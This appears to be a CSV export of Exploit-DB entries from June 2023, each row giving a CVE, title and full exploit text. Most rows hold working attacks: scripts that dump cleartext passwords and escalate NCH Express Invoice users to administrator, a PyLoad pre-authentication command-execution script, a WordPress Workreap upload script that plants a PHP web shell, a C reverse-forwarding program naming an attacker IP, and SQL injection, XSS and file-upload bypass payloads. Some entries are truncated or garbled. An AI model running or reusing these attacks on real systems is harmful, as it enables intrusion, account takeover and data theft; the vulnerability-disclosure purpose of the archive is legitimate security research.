CVE-2020-11560,"{""CVE-2020-11560"": 1}",2023-06-23,NCH Express Invoice - Clear Text Password Storage and Account Takeover,https://www.exploit-db.com/exploits/51540,"Exploit Title: NCH Express Invoice - Clear Text Password Storage and Account Takeover Google Dork:: intitle:ExpressInvoice - Login Date: 07/Apr/2020 Exploit Author: Tejas Nitin Pingulkar ( <URL> Vendor Homepage: <URL> Software Link: <URL> Version: NCH Express Invoice 8.24 and before CVE Number : CVE-2020-11560 CVSS: 7.8 (High) Reference: <URL> Vulnerability Description: Express Invoice is a thick client application that has functionality to allow the application access over the web. While configuring web access function application ask for user details such as username, password, email, etc. Application stores this information in “C:\ProgramData\NCH Software\ExpressInvoice\Accounts” in clear text as well as due to inadequate folder pemtion any Low prevladge authenticated user can access files stored in cleartext format Note: from version 8.24 path changed to “C:\ProgramData\NCH Software\ExpressInvoice\WebAccounts” import os import urllib.parse Enable ANSI escape sequences for colors on Windows if os.name == 'nt': os.system('') Function to decode URL encoding def decodeurl(url): decodedurl = urllib.parse.unquote(url) return decodedurl Function to list files and display as numeric list def listfiles(filelist): for i, file in enumerate(filelist, start=1): Omit the part of the file name after %40 username = file.split(""%40"")[0] print(f""{i}. {username}"") Main program print(""\033[93mDisclaimer: This script is for educational purposes only."") print(""The author takes no responsibility for any unauthorized usage."") print(""Please use this script responsibly and adhere to the legal and ethical guidelines.\033[0m"") agreement = input(""\033[93mDo you agree to the terms? (yes=1, no=0): \033[0m"") if agreement != '1': print(""\033[93mYou did not agree to the terms. Exiting the program.\033[0m"") exit() nchversion = input(""\033[93mIs the targeted NCH Express Invoice application version less than 8.24? (yes=1, no=0): \033[0m"") if nchversion == '1': filedirectory = r""C:\ProgramData\NCH Software\ExpressInvoice\WebAccounts"" else: filedirectory = r""C:\ProgramData\NCH Software\ExpressInvoice\Accounts"" filelist = os.listdir(filedirectory) print(""\033[94mUser Accounts:\033[0m"") listfiles(filelist) selectedfile = input(""\033[94mSelect the file number for the user: \033[0m"") selectedfile = int(selectedfile) - 1 filepath = os.path.join(filedirectory, filelist[selectedfile]) with open(filepath, 'r') as file: contents = file.read() print(f""\033[94mSelected User: {filelist[selectedfile].split('%40')[0]}\033[0m"") exploitoption = input(""\n\033[94mSelect the exploit option: "" ""\n1. Display User Passwords "" ""\n2. Account Takeover Using Password Replace "" ""\n3. User Privilege Escalation\nOption: \033[0m"") Exploit actions if exploitoption == ""1"": decodedcontents = decodeurl(contents) print(""\033[91mPlease find the password in the below string:\033[0m"") print(decodedcontents) elif exploitoption == ""2"": newpassword = input(""\033[92mEnter the new password: \033[0m"") currentpassword = contents.split(""Password="")[1].split(""&"")[0] replacedcontents = contents.replace(f""Password={currentpassword}"", f""Password={newpassword}"") print(""\033[92mSelected user's password changed to: Your password\033[0m"") print(replacedcontents) with open(filepath, 'w') as file: file.write(replacedcontents) elif exploitoption == ""3"": replacedcontents = contents.replace(""Administrator=0"", ""Administrator=1"").replace(""Priviligies=2"", ""Priviligies=1"") print(""\033[92mUser is now an Administrator.\033[0m"") print(replacedcontents) with open(filepath, 'w') as file: file.write(replaced_contents) else: print(""\033[91mInvalid exploit option. Exiting the program.\033[0m"") exit() print(""\033[91mFor more such interesting exploits, visit cvewalkthrough.com\033[0m"") input(""\033[91mPress enter to exit.\033[0m"")"
CVE-2023-34834,"{""CVE-2023-34834"": 1}",2023-06-23,MCL-Net 4.3.5.8788 - Information Disclosure,https://www.exploit-db.com/exploits/51542,"Exploit Title: MCL-Net 4.3.5.8788 - Information Disclosure Date: 5/31/2023 Exploit Author: Victor A. Morales, GM Sectec Inc. Vendor Homepage: <URL> Version: 4.3.5.8788 (other versions may be affected) Tested on: Microsoft Windows 10 Pro CVE: CVE-2023-34834 Description: Directory browsing vulnerability in MCL-Net version 4.3.5.8788 webserver running on default port 5080, allows attackers to gain sensitive information about the configured databases via the ""/file"" endpoint. Steps to reproduce: 1. Navigate to the webserver on default port 5080, where ""Index of Services"" will disclose directories, including the ""/file"" directory. 2. Browse to the ""/file"" directory and database entry folders configured 3. The ""AdoInfo.txt"" file will contain the database connection strings in plaintext for the configured database. Other files containing database information are also available inside the directory."
CVE-2022-47076,"{""CVE-2022-47076"": 1}",2023-06-22,Smart Office Web 20.28 - Remote Information Disclosure (Unauthenticated),https://www.exploit-db.com/exploits/51539,"Exploit Title: Smart Office Web 20.28 - Remote Information Disclosure (Unauthenticated) Shodan Dork:: inurl:"" <URL> Date: 09/Dec/2022 Exploit Author: Tejas Nitin Pingulkar ( <URL> Vendor Homepage: <URL> Software Link: <URL> Version: Smart Office Web 20.28 and before CVE Number : CVE-2022-47075 and CVE-2022-47076 CVSS : 7.5 (High) Reference : <URL> Vulnerability Description: Smart Office Web 20.28 and before allows Remote Information Disclosure(Unauthenticated) via insecure direct object reference (IDOR). This was fixed in latter version except for ExportEmployeeDetails. import wget import os from colorama import Fore, Style def downloadfile(url, filename): wget.download(url, filename) Disclaimer print(Fore.YELLOW + ""Disclaimer: This script is for educational purposes only."") print(""The author takes no responsibility for any unauthorized usage."") print(""Please use this script responsibly and adhere to the legal and ethical guidelines."") agree = input(""Do you agree to the disclaimer? (1 = Yes, 0 = No): "") if agree != ""1"": print(""You have chosen not to agree. Exiting the script."") exit() Print name in red name = ""Exploit by Tejas Nitin Pingulkar"" print(Fore.RED + name) print(Style.RESETALL) Reset color website = input(""Enter URL [ <URL> or <URL> "") targetversion = input(""Is the target software version 20.28 or later? (1 = Yes, 0 = No): "") foldername = input(""Enter the folder name to save the files: "") Create the folder if it doesn't exist if not os.path.exists(foldername): os.makedirs(foldername) urlsfilenames = [] if targetversion == ""1"": urlsfilenames.append((website + ""/ExportEmployeeDetails.aspx?ActionName=ExportEmployeeOtherDetails"", ""ExportEmployeeOtherDetails.csv"")) else: urlsfilenames.extend([ (website + ""/ExportEmployeeDetails.aspx?ActionName=ExportEmployeeDetails"", ""ExportEmployeeDetails.csv""), (website + ""/DisplayParallelLogData.aspx"", ""DisplayParallelLogData.txt""), (website + ""/ExportReportingManager.aspx"", ""ExportReportingManager.csv""), (website + ""/ExportEmployeeLoginDetails.aspx"", ""ExportEmployeeLoginDetails.csv"") print(""CVE-2022-47076: Obtain user ID and password from downloaded source"") for url, filename in urlsfilenames: downloadfile(url, os.path.join(foldername, filename)) Print ""for more such interesting exploits, visit cvewalkthrough.com"" in red print(Fore.RED + ""\nFor more such interesting exploits, visit cvewalkthrough.com"") print(Style.RESETALL) Reset color"
CVE-2023-25187,"{""CVE-2023-25187"": 1}",2023-06-20,Nokia ASIKA 7.13.52 - Hard-coded private key disclosure,https://www.exploit-db.com/exploits/51535,"include include include include include include include include include include include // The IP address of the vulnerable device char host = ""192.168.1.1""; int port = 22; char username = ""serviceuser""; char *password = ""password123""; char *attackerip = ""10.0.0.1""; int attackerport = 2222; define MAXLEN 1024 void forwarddata(int sock1, int sock2) char buffer[MAXLEN]; ssizet bytesread; while ((bytesread = read(sock1, buffer, MAXLEN)) > 0) write(sock2, buffer, bytesread); int main() int sock, pid1, pid2; struct sockaddrin addr; char argv[] = {""/usr/bin/ssh"", ""-l"", username, ""-p"", ""2222"", ""-o"", ""StrictHostKeyChecking=no"", ""-o"", ""UserKnownHostsFile=/dev/null"", ""-o"", ""PasswordAuthentication=no"", ""-o"", ""PubkeyAuthentication=yes"", ""-i"", ""/path/to/private/key"", ""-N"", ""-R"", ""2222:localhost:22"", host, NULL}; sock = socket(AF_INET, SOCK_STREAM, 0); memset(&addr, 0, sizeof(addr)); addr.sin_family = AF_INET; addr.sin_port = htons(port); inet_pton(AF_INET, host, &addr.sin_addr); if (connect(sock, (struct sockaddr )&addr, sizeof(addr)) < 0) fprintf(stderr, ""Error connecting to %s:%d: %s\n"", host, port, strerror(errno)); exit(1); write(sock, ""SSH-2.0-OpenSSH7.2p2 Ubuntu-4ubuntu2.10\r\n"", 42); read(sock, NULL, 0); write(sock, username, strlen(username)); write(sock, ""\r\n"", 2); read(sock, NULL, 0); write(sock, password, strlen(password)); write(sock, ""\r\n"", 2); sleep(1); pid1 = fork(); if (pid1 == 0) execv(""/usr/bin/ssh"", argv); exit(0); pid2 = fork(); if (pid2 == 0) execl(""/usr/sbin/sshd"", ""/usr/sbin/sshd"", ""-p"", ""2222"", ""-o"", ""StrictModes=no"", ""-o"", ""PasswordAuthentication=no"", ""-o"", ""PubkeyAuthentication=yes"", ""-o"", ""AuthorizedKeysFile=/dev/null"", ""-o"", ""HostKey=/path/to/private/key"", NULL); exit(0); sleep(1); pid1 = fork(); if (pid1 == 0) forwarddata(sock, STDINFILENO); exit(0); pid2 = fork(); if (pid2 == 0) forwarddata(STDOUT_FILENO, sock); exit(0); waitpid(pid1, NULL, 0); waitpid(pid2, NULL, 0); close(sock); return 0;"
CVE-2023-3320,"{""CVE-2023-3320"": 1}",2023-06-20,WP Sticky Social 1.0.1 - Cross-Site Request Forgery to Stored Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/51533,"Exploit Title: WP Sticky Social 1.0.1 - Cross-Site Request Forgery to Stored Cross-Site Scripting (XSS) Dork: inurl:~/admin/views/admin.php Date: 2023-06-20 Exploit Author: Amirhossein Bahramizadeh Category : Webapps Vendor Homepage: <URL> Version: 1.0.1 (REQUIRED) Tested on: Windows/Linux CVE : CVE-2023-3320 import requests import hashlib import time Set the target URL url = "" <URL> Set the user agent string useragent = ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"" Generate the nonce value nonce = hashlib.sha256(str(time.time()).encode('utf-8')).hexdigest() Set the data payload payload = { ""wpssnonce"": nonce, ""wpsssetting1"": ""value1"", ""wpsssetting2"": ""value2"", Add additional settings as needed Set the request headers headers = { ""User-Agent"": useragent, ""Referer"": url, ""Cookie"": ""wordpressloggedin=1; wp-settings-1=editor%3Dtinymce%26libraryContent%3Dbrowse%26uploader%3Dwp-plupload%26urlbutton%3Dfile; wp-settings-time-1=1495271983"", Add additional headers as needed Send the POST request response = requests.post(url, data=payload, headers=headers) Check the response status code if response.status_code == 200: print(""Request successful"") else: print(""Request failed"")"
CVE-2023-2779,"{""CVE-2023-2779"": 1}",2023-06-20,Super Socializer 7.13.52 - Reflected XSS,https://www.exploit-db.com/exploits/51534,"Exploit Title: Super Socializer 7.13.52 - Reflected XSS Dork: inurl: <URL> Date: 2023-06-20 Exploit Author: Amirhossein Bahramizadeh Category : Webapps Vendor Homepage: <URL> Version: 7.13.52 (REQUIRED) Tested on: Windows/Linux CVE : CVE-2023-2779 import requests The URL of the vulnerable AJAX endpoint url = "" <URL> The vulnerable parameter that is not properly sanitized and escaped vulnerableparam = "" "" The payload that exploits the vulnerability payload = {""action"": ""thechampsharingcount"", ""urls["" + vulnerableparam + ""]"": "" <URL> Send a POST request to the vulnerable endpoint with the payload response = requests.post(url, data=payload) Check if the payload was executed by searching for the injected script tag if "" "" in response.text: print(""Vulnerability successfully exploited"") else: print(""Vulnerability not exploitable"")"
CVE-2023-27372,"{""CVE-2023-27372"": 1}",2023-06-20,SPIP v4.2.0 - Remote Code Execution (Unauthenticated),https://www.exploit-db.com/exploits/51536,"#!/usr/bin/env python3 # -- coding: utf-8 -- Exploit Title: SPIP v4.2.1 - Remote Code Execution (Unauthenticated) Google Dork: inurl:""/spip.php?page=login"" Date: 19/06/2023 Exploit Author: nuts7 ( <URL> Vendor Homepage: <URL> Software Link: <URL> Version: < 4.2.1 (Except few fixed versions indicated in the description) Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0 CVE reference : CVE-2023-27372 (coiffeur) CVSS : 9.8 (Critical) Vulnerability Description: SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1. This"
CVE-2023-33580,"{""CVE-2023-33580"": 1}",2023-06-19,Student Study Center Management System v1.0 - Stored Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/51528,"Exploit Title: Student Study Center Management System v1.0 - Stored Cross-Site Scripting (XSS) Date of found: 12/05/2023 Exploit Author: VIVEK CHOUDHARY Version: V1.0 Tested on: Windows 10 Vendor Homepage: <URL> Software Link: <URL> CVE: CVE-2023-33580 CVE URL: <URL> Vulnerability Description - The Student Study Center Management System V1.0, developed by PHPGurukul, is susceptible to a critical security vulnerability known as Stored Cross-Site Scripting (XSS). This vulnerability enables attackers to inject malicious JavaScript code, which is then stored and executed by the application. The underlying issue lies in the system's failure to adequately sanitize and validate user-provided input within the ""Admin Name"" field on the Admin Profile page, thereby allowing attackers to inject arbitrary JavaScript code. Steps to Reproduce - The following steps demonstrate how to exploit the Stored XSS vulnerability in the Student Study Center Management System V1.0: 1. Visit the Student Study Center Management System V1.0 application by accessing the URL: <URL> 2. Click on the ""Admin"" button to navigate to the admin login page. 3. Login to the Admin account using the default credentials. - Username: admin - Password: Test 4. Proceed to the Admin Profile page. 5. Within the ""Admin Name"" field, inject the following XSS payload, enclosed in brackets: {""> }. 6. Click on the ""Submit"" button. 7. Refresh the page, and the injected payload will be executed. As a result of successful exploitation, the injected JavaScript code will be stored in the application's database. Subsequently, whenever another user accesses the affected page, the injected code will execute, triggering an alert displaying the text ""XSS."" This allows the attacker to execute arbitrary code within the user's browser, potentially leading to further attacks or unauthorized actions."
CVE-2023-23956,"{""CVE-2023-23956"": 1}",2023-06-19,Symantec SiteMinder WebAgent v12.52 - Cross-site scripting (XSS),https://www.exploit-db.com/exploits/51530,"Exploit Title: Symantec SiteMinder WebAgent v12.52 - Cross-site scripting (XSS) Google Dork: N/A Date: 18-06-2023 Exploit Author: Harshit Joshi Vendor Homepage: <URL> Software Link: <URL> Version: 12.52 Tested on: Linux, Windows CVE: CVE-2023-23956 Security Advisory: <URL> Description: I am writing to report two XSS vulnerabilities (CVE-2023-23956) that I have discovered in the Symantec SiteMinder WebAgent. The vulnerability is related to the improper handling of user input and has been assigned the Common Weakness Enumeration (CWE) code CWE-79. The CVSSv3 score for this vulnerability is 5.4. Vulnerability Details: Impact: This vulnerability allows an attacker to execute arbitrary JavaScript code in the context of the affected application. Steps to Reproduce: First: 1) Visit - <URL> 2) After visiting the above URL, click on the ""Change Password"" button, and the popup will appear. - The SMAGENTNAME parameter is the source of this vulnerability. - Payload Used: -SM-/"" onfocus=""alert(1)"" autofocus="" Second: 1) Visit - <URL> 2) After visiting the above URL, click on the ""Change Password"" button, and the popup will appear. - The TARGET parameter is the source of this vulnerability. - Payload Used: -SM-/"" onfocus=""alert(1)"" autofocus="""
CVE-2020-11027,"{""CVE-2020-11027"": 1}",2023-06-19,WordPress Theme Medic v1.0.0 - Weak Password Recovery Mechanism for Forgotten Password,https://www.exploit-db.com/exploits/51531,"Exploit Title: WordPress Theme Medic v1.0.0 - Weak Password Recovery Mechanism for Forgotten Password Dork: inurl:/wp-includes/class-wp-query.php Date: 2023-06-19 Exploit Author: Amirhossein Bahramizadeh Category : Webapps Vendor Homepage: <URL> Version: 1.0.0 (REQUIRED) Tested on: Windows/Linux CVE: CVE-2020-11027 import requests from bs4 import BeautifulSoup from datetime import datetime, timedelta Set the WordPress site URL and the user email address siteurl = ' <URL> useremail = 'user.com' Get the password reset link from the user email You can use any email client or library to retrieve the email In this example, we are assuming that the email is stored in a file named 'passwordresetemail.html' with open('passwordresetemail.html', 'r') as f: email = f.read() soup = BeautifulSoup(email, 'html.parser') resetlink = soup.find('a', href=True)['href'] print(f'Reset Link: {resetlink}') Check if the password reset link expires upon changing the user password response = requests.get(resetlink) if response.statuscode == 200: Get the expiration date from the reset link HTML soup = BeautifulSoup(response.text, 'html.parser') expirationdatestr = soup.find('p', string=lambda s: 'Password reset link will expire on' in s).text.split('on ')[1] expirationdate = datetime.strptime(expirationdatestr, '%B %d, %Y %I:%M %p') print(f'Expiration Date: {expirationdate}') Check if the expiration date is less than 24 hours from now if expirationdate < datetime.now() + timedelta(hours=24): print('Password reset link expires upon changing the user password.') else: print('Password reset link does not expire upon changing the user password.') else: print(f'Error fetching reset link: {response.statuscode} {response.text}') exit()"
CVE-2023-0297,"{""CVE-2023-0297"": 1}",2023-06-14,PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE),https://www.exploit-db.com/exploits/51532,"Exploit Title: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE) Date: 06-10-2023 Credits: bAu Exploit Author: Gabriel Lima (0xGabe) Vendor Homepage: <URL> Software Link: <URL> Version: 0.5.0 Tested on: Ubuntu 20.04.6 CVE: CVE-2023-0297 import requests, argparse parser = argparse.ArgumentParser() parser.addargument('-u', action='store', dest='url', required=True, help='Target url.') parser.addargument('-c', action='store', dest='cmd', required=True, help='Command to execute.') arguments = parser.parseargs() def doRequest(url): try: res = requests.get(url + '/flash/addcrypted2') if res.statuscode == 200: return True else: return False except requests.exceptions.RequestException as e: print(""[!] Maybe the host is offline :"", e) exit() def runExploit(url, cmd): endpoint = url + '/flash/addcrypted2' if "" "" in cmd: validCommand = cmd.replace("" "", ""%20"") else: validCommand = cmd payload = 'jk=pyimport%20os;os.system(""'+validCommand+'"");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' test = requests.post(endpoint, headers={'Content-type': 'application/x-www-form-urlencoded'},data=payload) print('[+] The exploit has be executeded in target machine. ') def main(targetUrl, Command): print('[+] Check if target host is alive: ' + targetUrl) alive = doRequest(targetUrl) if alive == True: print(""[+] Host up, let's exploit! "") runExploit(targetUrl,Command) else: print('[-] Host down! ') if(arguments.url != None and arguments.cmd != None): targetUrl = arguments.url Command = arguments.cmd main(targetUrl, Command)"
CVE-2023-3187,"{""CVE-2023-3187"": 1}",2023-06-13,Teachers Record Management System 1.0 - File Upload Type Validation,https://www.exploit-db.com/exploits/51512,"Exploit Title: Teachers Record Management System 1.0 – File Upload Type Validation Date: 17-01-2023 EXPLOIT-AUTHOR: AFFAN AHMED Vendor Homepage: Software Link: Version: 1.0 Tested on: Windows 11 + XAMPP CVE : CVE-2023-3187 STEPSTOREPRODUCE 1. Login into Teacher-Account with the credentials “Username: jogoe12.com” Password: Test” 2. Navigate to Profile Section and edit the Profile Pic by clicking on Edit Image 3. Open the Burp-suite and Intercept the Edit Image Request 4. In POST Request Change the “ Filename “ from “ profile picture.png “ to “profile picture.php.gif ” 5. Change the Content-type from “ image/png “ to “ image/gif “ 6. And Add this Payload : `GIF89a ` 7. Where GIF89a is the GIF magic bytes this bypass the file upload extension 8. Below is the Burpsuite-POST Request for all the changes that I have made above BURPSUITEREQUEST POST /trms/teacher/changeimage.php HTTP/1.1 Host: localhost Content-Length: 442 Cache-Control: max-age=0 sec-ch-ua: ""Chromium"";v=""109"", ""NotA Brand"";v=""99"" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: ""Windows"" Upgrade-Insecure-Requests: 1 Origin: Content-Type: multipart/form-data; boundary=-WebKitFormBoundaryndAPYa0GGOxSUHdF User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=8alf0rbfjmhm3ddra7si0cv7qc Connection: close -WebKitFormBoundaryndAPYa0GGOxSUHdF Content-Disposition: form-data; name=""subjects"" John Doe -WebKitFormBoundaryndAPYa0GGOxSUHdF Content-Disposition: form-data; name=""newpic""; filename=""profile picture.php.gif"" Content-Type: image/gif GIF89a -WebKitFormBoundaryndAPYa0GGOxSUHdF Content-Disposition: form-data; name=""submit"" -WebKitFormBoundaryndAPYa0GGOxSUHdF-- PROOFOFCONCEPT GITHUBLINK: <URL>"
CVE-2023-3184,"{""CVE-2023-3184"": 1}",2023-06-13,Sales Tracker Management System v1.0 - Multiple Vulnerabilities,https://www.exploit-db.com/exploits/51513,"Exploit Title: Sales Tracker Management System v1.0 – Multiple Vulnerabilities Google Dork: NA Date: 09-06-2023 EXPLOIT-AUTHOR: AFFAN AHMED Vendor Homepage: Software Link: Version: 1.0 Tested on: Windows 11 + XAMPP CVE : CVE-2023-3184 CREDENTIAL TO USE ADMIN-ACCOUNT USERNAME: admin PASSWORD: admin123 PAYLOADUSED 1. CLICKHEREFORFIRSTNAME 2. CLICKHEREFORMIDDLENAME 3. CLICKHEREFORLASTNAME 4. CLICKHEREFORUSERNAME = STEPSTOREPRODUCE 1. FIRST LOGIN INTO YOUR ACCOUNT BY USING THE GIVEN CREDENTIALS OF ADMIN 2. THEN NAVIGATE TO USERLIST AND CLCIK ON CREATE NEW BUTTON OR VISIT TO THIS URL: <URL> 3. THEN FILL UP THE DETAILS AND PUT THE ABOVE PAYLOAD IN firstname middlename lastname and in username 4. AFTER ENTERING THE PAYLOAD CLICK ON SAVE BUTTON 5. AFTER SAVING THE FORM YOU WILL BE REDIRECTED TO ADMIN SITE WHERE YOU CAN SEE THAT NEW USER IS ADDED . 6. AFTER CLICKING ON THE EACH PAYLOAD IT REDIRECT ME TO EVIL SITE BURPSUITEREQUEST POST /php-sts/classes/Users.php?f=save HTTP/1.1 Host: localhost Content-Length: 1037 sec-ch-ua: Accept: */* Content-Type: multipart/form-data; boundary=-WebKitFormBoundary7hwjNQW3mptDFOwo X-Requested-With: XMLHttpRequest sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36 sec-ch-ua-platform: """" Origin: <URL> Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: <URL> Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=r0ejggs25qnlkf9funj44b1pbn Connection: close -WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""id"" -WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""firstname"" CLICKHEREFORFIRSTNAME -WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""middlename"" CLICKHEREFORMIDDLENAME -WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""lastname"" CLICKHEREFORLASTNAME -WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""username"" CLICKHEREFORUSERNAME -WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""password"" 1234 -WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""type"" 2 -WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""img""; filename="""" Content-Type: application/octet-stream -WebKitFormBoundary7hwjNQW3mptDFOwo-- PROOFOFCONCEPT GITHUBLINK: <URL>"
CVE-2023-34096,"{""CVE-2023-34096"": 1}",2023-06-09,Thruk Monitoring Web Interface 3.06 - Path Traversal,https://www.exploit-db.com/exploits/51509,Exploit Title: Thruk Monitoring Web Interface 3.06 - Path Traversal Date: 08-Jun-2023 Exploit Author: Galoget Latorre () CVE: CVE-2023-34096 (Galoget Latorre) Vendor Homepage: <URL> Software Link: <URL> Software Link + Exploit +
CVE-2021-24499,"{""CVE-2021-24499"": 1}",2023-06-09,WordPress Theme Workreap 2.2.2 - Unauthenticated Upload Leading to Remote Code Execution,https://www.exploit-db.com/exploits/51510,"Exploit Title: WordPress Theme Workreap 2.2.2 - Unauthenticated Upload Leading to Remote Code Execution Dork: inurl:/wp-content/themes/workreap/ Date: 2023-06-01 Category : Webapps Vendor Homepage: <URL> Exploit Author: Mohammad Hossein Khanaki(MrB0hl00l) Version: 2.2.2 Tested on: Windows/Linux CVE: CVE-2021-24499 import requests import random import string import sys def usage(): banner = ' NAME: WordPress Theme Workreap 2.2.2 - Unauthenticated Upload Leading to Remote Code Execution usage: python3 Workreaprce.py example for linux : python3 Workreaprce.py <URL> example for Windows : python Workreaprce.py <URL> print(f""{BOLD}{banner}{ENDC}"") def uploadfile(target): print(""[ ] Uploading File"") url = target + ""/wp-admin/admin-ajax.php"" body = "" "" data = {""action"": ""workreapawardtempfileuploader""} response = requests.post(url, data=data, files={""awardimg"": (filename, body)}) if '{""type"":""success"",' in response.text: print(f""{GREEN}[+] File uploaded successfully{ENDC}"") checkphpfile(target) else: print(f""{RED}[+] File was not uploaded{ENDC}"") def checkphpfile(target): response2 = requests.get(target + ""/wp-content/uploads/workreap-temp/"" + filename) if randomstr in response2.text: print(f""{GREEN}The uploaded PHP file executed successfully.{ENDC}"") print(""path: "" + target +""/wp-content/uploads/workreap-temp/"" + filename) question = input(f""{YELLOW}Do you want get RCE? [Y/n] {ENDC}"") if question == ""y"" or question == ""Y"": print(""[ ] Uploading Shell "") getrce(target) else: usage() else: print(f""{RED}[+] PHP file not allowed on this website. Try uploading another file.{ENDC}"") def getrce(target): filename = ''.join(random.choices(string.asciilowercase + string.digits, k=8)) + "".php"" body = ' \n$output "";?>' data = {""action"": ""workreapawardtempfileuploader""} response3 = requests.post(target + '/wp-admin/admin-ajax.php', data=data, files={""awardimg"": (filename, body)}) print(f""{GREEN}[+] Shell uploaded successfully{ENDC}"") while True: command = input(f""{YELLOW}Enter a command to execute: {ENDC}"") print(f""Shell Path : {target}'/wp-content/uploads/workreap-temp/{BOLD}{filename}?c={command}{ENDC}"") response4 = requests.get(target + '/wp-content/uploads/workreap-temp/' + filename + f""?c={command}"") print(f""{GREEN}{response4.text}{ENDC}"") if name == ""main"": global GREEN , RED, YELLOW, BOLD, ENDC GREEN = '\033[92m' RED = '\033[91m' YELLOW = '\033[93m' BOLD = '\033[1m' ENDC = '\033[0m' filename = ''.join(random.choices(string.asciilowercase + string.digits, k=8)) + "".php"" randomstr = ''.join(random.choices(string.asciilowercase + string.digits, k=8)) try: uploadfile(sys.argv[1]) except IndexError: usage() except requests.exceptions.RequestException as e: print(""\nPlease Enter Valid Address"")"
CVE-2023-30868,"{""CVE-2023-30868"": 1}",2023-06-06,Tree Page View Plugin 1.6.7 - Cross Site Scripting (XSS),https://www.exploit-db.com/exploits/51507,"Exploit Title: Tree Page View Plugin 1.6.7 - Cross Site Scripting (XSS) Google Dork: inurl:/wp-content/plugins/cms-tree-page-view/ Date: 2023-04-24 Exploit Author: LEE SE HYOUNG (hackintoanetwork) Vendor Homepage: <URL> Software Link: <URL> Category: Web Application Version: 1.6.7 Tested on: Debian / WordPress 6.1.1 CVE : CVE-2023-30868 Reference: <URL> 1. Technical Description: The CMS Tree Page View plugin for WordPress has a Reflected Cross-Site Scripting vulnerability up to version 1.6.7. This is due to the post_type parameter not properly escaping user input. As a result, users with administrator privileges or higher can inject JavaScript code that will execute whenever accessed. 2. Proof of Concept ("
CVE-2023-33584,"{""CVE-2023-33584"": 1}",2023-06-04,Enrollment System Project v1.0 - SQL Injection Authentication Bypass (SQLI),https://www.exploit-db.com/exploits/51501,"Exploit Title: Enrollment System Project v1.0 - SQL Injection Authentication Bypass (SQLI) Date of found: 18/05/2023 Exploit Author: VIVEK CHOUDHARY Version: V1.0 Tested on: Windows 10 Vendor Homepage: <URL> Software Link: <URL> CVE: CVE-2023-33584 CVE URL: <URL> Vulnerability Description - Enrollment System Project V1.0, developed by Sourcecodester, has been found to be vulnerable to SQL Injection (SQLI) attacks. This vulnerability allows an attacker to manipulate the SQL queries executed by the application. The system fails to properly validate user-supplied input in the username and password fields during the login process, enabling an attacker to inject malicious SQL code. By exploiting this vulnerability, an attacker can bypass authentication and gain unauthorized access to the system. Steps to Reproduce - The following steps outline the exploitation of the SQL Injection vulnerability in Enrollment System Project V1.0: 1. Launch the Enrollment System Project V1.0 application. 2. Open the login page by accessing the URL: <URL> 3. In the username and password fields, insert the following SQL Injection payload shown inside brackets to bypass authentication: {' or 1=1 #}. 4. Click the login button to execute the SQL Injection payload. As a result of successful exploitation, the attacker gains unauthorized access to the system and is logged in with administrative privileges."
CVE-2023-33243,"{""CVE-2023-33243"": 1}",2023-06-04,STARFACE 7.3.0.10 - Authentication with Password Hash Possible,https://www.exploit-db.com/exploits/51503,"Exploit Title: STARFACE 7.3.0.10 - Authentication with Password Hash Possible Affected Versions: 7.3.0.10 and earlier versions Fixed Versions: - Vulnerability Type: Broken Authentication Security Risk: low Vendor URL: <URL> Vendor Status: notified Advisory URL: <URL> Advisory Status: published CVE: CVE-2023-33243 CVE URL: <URL> Introduction ""When functionality and comfort come together, the result is a state-of-the-art experience that we've dubbed 'comfortphoning'. It's a secure, scalable digital communication solution that meets every need and wish. STARFACE is easy to integrate into existing IT systems and flexibly grows with your requirements."" (from the vendor's homepage) More Details The image of STARFACE PBX [0] in version 7.3.0.10 can be downloaded from the vendor's homepage [1]. The included files can be further examined by either extracting the contents or running the image in a virtual machine. The web interface of the PBX uses the JavaScript file at the following path to submit the login form: js/prettifier.js The following two lines of the JavaScript file ""prettifier.js"" add the two parameters ""secret"" and ""ack"" to the form before being submitted: $form(document.forms[0]).add('secret', createHash(defaultVals.isAd, liv, lpv, defaultVals.k + defaultVals.bk)); $form(document.forms[0]).add('ack', defaultVals.k); The JavaScript object ""defaultVals"" is included in the web application's source text. While the value of ""defaultVals.k"" was found to be the static hash of the PBX version, the value of ""defaultVals.bk"" contains a nonce only valid for the currently used session. Therefore, the form parameter ""ack"" is always the same value. For the form value ""secret"" the function ""createHash()"" is called with different arguments. The value of ""defaultVals.isAd"" is set to ""false"" when login via Active Directory is disabled. The parameters ""liv"" and ""lpv"" 